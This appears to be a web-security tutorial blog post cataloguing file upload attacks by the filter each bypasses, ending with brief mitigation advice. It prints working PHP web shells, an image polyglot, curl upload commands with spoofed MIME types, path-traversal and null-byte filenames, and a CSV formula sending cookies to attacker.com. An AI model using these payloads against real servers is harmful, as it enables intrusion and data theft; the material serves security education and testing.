---
layout: article
title: "File Upload Attacks & Bypass Techniques"
date: 2025-03-18
categories: Web security
tags: security web tutorials penetration-testing best-practices file-upload
---

# **File Upload Attacks & Bypass Techniques**

File upload vulnerabilities arise when a server improperly handles user-uploaded files. Below are common file upload attack techniques categorized by the filtering methods they attempt to bypass.

---

## **1. No Filtering (Direct Execution)**
- **Attack:** Uploading a malicious executable file (e.g., `.php`, `.jsp`, `.exe`, `.sh`) and executing it.
- **Bypass:** No need for bypass; just upload a web shell.

### **Example: Basic PHP Web Shell**
```php
<?php system($_GET['cmd']); ?>
```
**Usage:** `http://example.com/uploads/shell.php?cmd=id`

---

## **2. Extension-Based Filtering**  
- **Filter:** Only allows specific extensions (e.g., `.jpg`, `.png`, `.pdf`).  
- **Bypass Techniques:**
  - **Double Extensions:** `shell.php.jpg`
  - **Case Manipulation:** `SHELL.PhP`
  - **Null Byte Injection:** `shell.php%00.jpg` (older PHP versions)
  - **MIME Type Spoofing:** Modifying request headers (e.g., `Content-Type: image/png`)
  - **Polyglot Files:** Embedding executable code in valid images/PDFs.

### **Example: Spoofing MIME Type with Burp Suite**
Modify the request before submission:
```http
POST /upload HTTP/1.1
Content-Type: image/png

[shell.php content]
```

---

## **3. MIME Type Filtering**  
- **Filter:** Server checks MIME type in headers (`image/jpeg`, `application/pdf`).  
- **Bypass Techniques:**
  - **Tampering with HTTP Headers** using Burp Suite.
  - **Using File Upload APIs Incorrectly** (some apps trust the client-side MIME check).

### **Example: Uploading Malicious File via `curl`**
```bash
curl -F 'file=@shell.php;type=image/png' http://example.com/upload
```

---

## **4. Content-Based Filtering**  
- **Filter:** Server inspects file content for malicious code.  
- **Bypass Techniques:**
  - **Encoding Payloads:** Base64, gzip, or hex encoding.
  - **Obfuscation:** Breaking patterns (e.g., `<?p\h\p eval($_GET['cmd']); ?>`)
  - **Appending Fake Image Headers:** Embedding PHP payload inside an image.

### **Example: PHP Code in Image Metadata**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

---

## **5. Directory Restriction (Upload Location)**  
- **Filter:** Files are uploaded to a non-executable directory.  
- **Bypass Techniques:**
  - **Path Traversal:** `../../var/www/html/shell.php`
  - **Symlink Attack:** Linking an allowed file type to a malicious script.
  - **Race Condition:** Uploading a safe file and quickly replacing it.

### **Example: Symlink Attack**
```bash
ln -s /var/www/html/shell.php safe.jpg
```

---

## **6. Client-Side Validation (JavaScript-Based)**  
- **Filter:** JavaScript checks file extension or size before submission.  
- **Bypass Techniques:**
  - **Disable JavaScript** in browser dev tools.
  - **Modify HTTP Request** using Burp Suite.
  - **Use a Custom Upload Script** (`curl`, `requests` in Python).

### **Example: Uploading Directly via `curl`**
```bash
curl -F 'file=@shell.php' http://example.com/upload
```

---

## **7. Image-Only Uploads (Strict Validation)**  
- **Filter:** Server verifies image integrity (`exif_imagetype()`, `getimagesize()`).  
- **Bypass Techniques:**
  - **Appending PHP Payload to Image Metadata:** `exiftool`
  - **Embedding Payload in Image Data:** Steganography.
  - **Leveraging Weak Parsers:** Manipulating image files.

### **Example: JPEG Polyglot (PHP + Image Header)**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```
---

## **8. Cloud Storage (S3, Google Drive, etc.)**  
- **Filter:** Files are stored separately with no execution permissions.  
- **Bypass Techniques:**
  - **Signed URL Hijacking:** Using pre-signed URLs for unauthorized access.
  - **XSS via File Preview:** Uploading JavaScript-embedded HTML/CSV files.

### **Example: XSS via CSV Upload**
```csv
=IMPORTXML("http://attacker.com/?cookie="&ENCODEURL(A1))
```
---

## **Mitigation Strategies**
✅ **Server-Side Validation:** Always check the file type and contents on the server.  
✅ **Use Safe Storage Locations:** Store uploads outside webroot.  
✅ **Strict MIME and Content Filtering:** Don’t rely on extensions alone.  
✅ **Disable Script Execution:** Block execution in upload directories.  
✅ **Randomized Filenames:** Prevent attackers from predicting and accessing files.

---
# YouTube Videos

Check out this awesome videos:

<iframe width="560" height="315" 
        src="https://www.youtube.com/embed/ZWG1nNdUnBc" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>
<iframe width="560" height="315" 
        src="https://www.youtube.com/embed/BJhTZlg5Ig8" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>
<iframe width="560" height="315" 
        src="https://www.youtube.com/embed/YAFVGQ-lBoM" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe>

💡 **Pro Tip:** Always test for multiple bypass techniques—many real-world applications fail at multiple levels. 🚀
